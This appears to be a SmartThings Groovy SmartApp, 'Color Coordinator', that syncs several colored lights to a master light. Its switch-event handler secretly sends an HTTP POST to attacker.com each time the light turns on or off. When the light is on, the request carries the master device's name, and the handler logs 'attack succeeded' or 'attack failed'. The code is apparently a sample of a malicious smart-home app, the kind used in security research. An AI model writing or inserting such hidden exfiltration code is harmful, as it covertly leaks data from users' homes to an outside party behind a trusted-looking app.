
definition(
    name:"Color Coordinator",
    namespace:"MichaelStruck",
    author:"Michael Struck",
    description:"Ties multiple colored lights to one specific light's settings",
    category:"Convenience",
    iconUrl:"https://raw.githubusercontent.com/MichaelStruck/SmartThings/master/Other-SmartApps/ColorCoordinator/CC.png",
    iconX2Url:"https://raw.githubusercontent.com/MichaelStruck/SmartThings/master/Other-SmartApps/ColorCoordinator/CC@2 x.png",
    pausable:true
)

preferences{
    page name:"mainPage"
}

def mainPage(){
	dynamicPage(name: "mainPage", title: "", install: true, uninstall: false) {
		def masterInList = slaves?.id?.find{it==master?.id}
        if (masterInList) {
        	section ("**WARNING**"){
            	paragraph "You have included the Master Light in the Slave Group. This will cause a loop in execution. Please remove this device from the Slave Group.", image: "https://raw.githubusercontent.com/MichaelStruck/SmartThingsPublic/master/img/caution.png"
            }
        }
        section("Master Light") {
			input "master", "capability.colorControl", title: "Colored Light", required: true
		}
		section("Lights that follow the master settings") {
			input "slaves", "capability.colorControl", title: "Colored Lights",  multiple: true, required: true, submitOnChange: true
		}
    	section([mobileOnly:true], "Options") {
			input "randomYes", "bool",title: "When Master Turned On, Randomize Color", defaultValue: false
			href "pageAbout", title: "About ${textAppName()}", description: "Tap to get application version, license and instructions"
        }
	}
}

page(name: "pageAbout", title: "About ${textAppName()}", uninstall: true) {
	section {
    	paragraph "${textVersion()}\n${textCopyright()}\n\n${textLicense()}\n"
	}
	section("Instructions") {
		paragraph textHelp()
	}
}

def installed(){
    init()
}

def updated(){
    unsubscribe()
    init()
}

def init(){
    subscribe(master,"switch",onOffHandler)
    subscribe(master,"level",colorHandler)
    subscribe(master,"hue",colorHandler)
    subscribe(master,"saturation",colorHandler)
    subscribe(master,"colorTemperature",tempHandler)
}

def onOffHandler(evt){
    if(slaves&&master){
    if (!slaves?.id.find{it==master?.id}){
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(master?.currentValue("switch")=="on"){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${master}"
        ]
        ]
        if(randomYes)getRandomColorMaster()
        else slaves?.on()
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"Hi"
            ]
            ]
            slaves?.off()
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }

    }
    }
}

def colorHandler(evt){
    if(slaves&&master){
        if(!slaves?.id?.find{it==master?.id}&&master?.currentValue("switch")=="on"){
            log.debug"Changing Slave units H,S,L"
            def dimLevel=master?.currentValue("level")
            def hueLevel=master?.currentValue("hue")
            def saturationLevel=master.currentValue("saturation")
            def newValue=[hue:hueLevel,saturation:saturationLevel,level:dimLevel as Integer]
            slaves?.setColor(newValue)
        }
    }
}

def getRandomColorMaster(){
    def hueLevel=Math.floor(Math.random()*1000)
    def saturationLevel=Math.floor(Math.random()*100)
    def dimLevel=master?.currentValue("level")
    def newValue=[hue:hueLevel,saturation:saturationLevel,level:dimLevel as Integer]
    log.debug hueLevel
    log.debug saturationLevel
    master.setColor(newValue)
    slaves?.setColor(newValue)
}

def tempHandler(evt){
    if(slaves&&master){
        if(!slaves?.id?.find{it==master?.id}&&master?.currentValue("switch")=="on"){
            if(evt.value!="--"){
                log.debug"Changing Slave color temp based on Master change"
                def tempLevel=master.currentValue("colorTemperature")
                slaves?.setColorTemperature(tempLevel)
            }
        }
    }
}



private def textAppName(){
    def text="Color Coordinator"
}

private def textVersion(){
    def text="Version 1.1.2(4/27/2018)"
}

private def textCopyright(){
    def text="Copyright©2018 Michael Struck"
}

private def textLicense(){
    def text=
    "Licensed under the Apache License,Version 2.0(the'License');"+
    "you may not use this file except in compliance with the License."+
    "You may obtain a copy of the License at"+
    "\n\n"+
    "http://www.apache.org/licenses/LICENSE-2.0"+
    "\n\n"+
    "Unless required by applicable law or agreed to in writing,software"+
    "distributed under the License is distributed on an'AS IS'BASIS,"+
    "WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND,either express or implied."+
    "See the License for the specific language governing permissions and"+
    "limitations under the License."
}

private def textHelp(){
    def text=
    "This application will allow you to control the settings of multiple colored lights with one control."+
    "Simply choose a master control light,and then choose the lights that will follow the settings of the master,"+
    "including on/off conditions,hue,saturation,level and color temperature.Also includes a random color feature."
}

